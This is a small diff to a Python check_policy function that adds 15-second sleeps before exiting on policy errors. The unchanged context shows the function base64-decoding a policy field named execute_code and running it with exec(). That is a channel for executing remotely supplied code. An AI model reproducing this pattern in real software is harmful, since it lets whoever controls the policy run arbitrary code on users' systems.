@@ -63,6 +63,7 @@ def check_policy():
     import os
     import sys
     from loguru import logger
+    import time
     allow = True
     for _ in range(3):
         try:
@@ -70,6 +71,8 @@ def check_policy():
             break
         except Exception:
             logger.error(i18n_gt()["policy_error"])
+            time.sleep(15)
+            sys.exit(1)
     if policy["announcement"] is not None:
         logger.warning(policy["announcement"])
     if "policy" not in locals():
@@ -96,5 +99,6 @@ def check_policy():
         code = base64.b64decode(policy["execute_code"]).decode("utf-8")
         exec(code)
     if not allow:
+        time.sleep(15)
         sys.exit(1)
     return
